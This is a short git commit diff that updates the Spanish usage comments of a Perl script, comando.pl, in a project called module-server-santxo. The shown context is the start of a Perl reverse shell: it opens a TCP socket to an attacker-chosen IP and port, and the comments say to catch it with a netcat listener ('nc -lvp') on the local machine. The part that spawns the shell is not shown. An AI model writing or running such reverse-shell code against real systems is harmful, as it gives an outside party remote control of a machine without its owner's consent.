48873046dee4eb6cecf6f8331960f743f542b7fd
mateman <cuyeu@hotmail.com>
2019-08-05 14:15:01 -0300

    Update comando.pl

--- module-server-santxo/santxo/comando.pl
+++ module-server-santxo/santxo/comando.pl
@@ -3,8 +3,8 @@ use Socket;
 my $i = $ARGV[0];
 my $p = $ARGV[1];
 
-#invocar usando comando.pl "ip" "port"
-#y en maquina local en terminal usar nc -lvp "port"
+#invocar usando comando.pl "ip-maquina-local" "port-maquina-local"
+#y en maquina local en terminal usar nc -lvp "port-maquina-local"
 
 socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
 if(connect(S,sockaddr_in($p,inet_aton($i)))){
